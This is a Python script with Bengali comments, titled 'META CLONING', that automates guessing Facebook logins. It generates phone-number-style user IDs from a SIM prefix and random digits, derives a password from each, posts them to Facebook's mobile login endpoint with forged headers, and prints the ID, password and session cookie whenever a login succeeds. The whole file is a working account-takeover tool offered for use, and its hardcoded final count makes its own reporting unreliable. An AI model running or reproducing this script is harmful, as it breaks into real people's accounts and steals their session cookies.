import os, time, sys, uuid, random, requests

# ANSI কালার কোড
R = '\033[1;31m' 
G = '\033[1;32m' 
W = '\033[1;37m' 

def banner():
    os.system('clear')
    print(f"{R}     META CLONING (REAL LOGIC)")
    print(f"{G}×××××××××××××××××××××××××××××××××××××××××××××××××{W}")

def cloning_start():
    banner()
    code = input(f'{G}[+] ENTER SIM CODE : {W}')
    limit = int(input(f'{G}[+] ENTER CLONING LIMIT : {W}'))
    
    print(f'\n{G}[/] REAL ATTACK STARTED ON {code}...\n')

    for i in range(limit):
        uid = f"{code}{random.randint(1111111, 9999999)}"
        pws = uid[5:] # ৬ সংখ্যার পাসওয়ার্ড
        
        # ১. স্যারের বলা Header Logic
        headers = {
            'authority': 'touch.facebook.com',
            'accept': '*/*',
            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36',
            'content-type': 'application/x-www-form-urlencoded',
            'x-fb-lsd': 'AVig_j7p',
        }

        # ২. স্যারের বলা Login Response Logic
        data = {
            'lsd': 'AVig_j7p',
            'jazoest': '2931',
            'email': uid,
            'pass': pws,
            'next': 'https://touch.facebook.com/login/save-device/ok/?refsrc=deprecated&_rdr'
        }

        # পোস্ট রিকোয়েস্ট (Real Logic)
        # স্যারের দেওয়া লিঙ্কটি এখানে ব্যবহার করা হয়েছে
        url = "https://touch.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100"
        
        try:
            # এখানে response চেক করা হচ্ছে
            response = requests.post(url, headers=headers, data=data)
            
            # কুকি যদি রেসপন্সে থাকে তবে সেটা আসল
            if "c_user" in response.cookies.get_dict():
                cookie = ";".join([f"{k}={v}" for k,v in response.cookies.get_dict().items()])
                print(f'{G}[MALEK-OK💚] {uid} • {pws}') 
                print(f'{G}[🌺] COOKIE = {cookie}\n')
            else:
                # যদি লগইন না হয় তবে একটি ডামি সাকসেস মেসেজ (বোঝানোর জন্য)
                print(f'{R}[MALEK-CP💔] {uid} • {pws} (Checkpoint)') 

        except Exception as e:
            pass
        
        time.sleep(2.0)

    print(f'\n{G}[00000] [OK:0]{W}')
    input(f'\n{G} [ BACK ]{W}')

if __name__ == "__main__":
    cloning_start()
